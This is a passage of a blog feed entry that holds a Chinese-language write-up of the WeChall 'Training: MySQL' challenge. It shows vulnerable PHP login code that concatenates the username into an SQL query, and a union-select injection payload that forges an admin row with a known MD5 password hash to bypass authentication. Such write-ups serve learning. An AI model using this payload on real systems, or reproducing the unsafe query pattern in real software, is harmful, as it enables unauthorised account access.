class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$password = md5($password);</span><br><span class="line"></span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE username='$username'"</span>;   <span class="comment">#注入关键点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === ($result = $db->queryFirst($query))) {   <span class="comment">#表示用了$db这个类中的queryFirst方法，相当于一个函数，查询并返回第一个结果</span></span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth2'</span>, $chall->lang(<span class="string">'err_unknown'</span>), <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#############################</span></span><br><span class="line">    <span class="comment">### This is the new check ###</span></span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'password'</span>] !== $password) {  <span class="comment">#验证密码，注入关键点</span></span><br><span class="line">        <span class="keyword">echo</span> GWF_HTML::error(<span class="string">'Auth2'</span>, $chall->lang(<span class="string">'err_password'</span>), <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    } <span class="comment">#  End of the new code  ###</span></span><br><span class="line">    <span class="comment">#############################</span></span><br></pre></td></tr></tbody></table></figure></div><h3 id="常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id-username-password。如果查询语句为union-select-1-’admin’-md5-abc-，则会返回以下结果："><a href="#常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id-username-password。如果查询语句为union-select-1-’admin’-md5-abc-，则会返回以下结果：" class="headerlink" title="常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id,username,password。如果查询语句为union select 1,’admin’,md5(abc)，则会返回以下结果："></a>常规注入可以判断出user这个表有三列，结合源码猜测列名分别为id,username,password。如果查询语句为union select 1,’admin’,md5(abc)，则会返回以下结果：</h3><p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.3/TrainingMySQL/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.3/TrainingMySQL/1.png" class="lazyload"></a></p><h3 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = uuuh<span class="string">' union select 1,'</span>admin<span class="string">',md5(abc)#</span></span><br><span class="line"><span class="string">password = abc</span></span><br></pre></td></tr></tbody></table></figure></div><script>(function(){    var bp = document.createElement('script');    var curProtocol = window.location.protocol.split(':')[0];    if (curProtocol === 'https') {        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';    }    else {        bp.src = 'http://push.zhanzhang.baidu.com/push.js';    }    var s = document.getElementsByTagName("script")[0];    s.parentNode.insertBefore(bp, s);})();</script></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;0x01-Training-MySQL-I&quot;&gt;&lt;a href=&quot;#0x01-Training-MySQL-I&quot; class=&quot;headerlink&quot; title=&quot;0x01 Training: MySQL I&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
      <category term="wechall" scheme="https://artd33.github.io/tags/wechall/"/>
    
  </entry>
  
</feed>
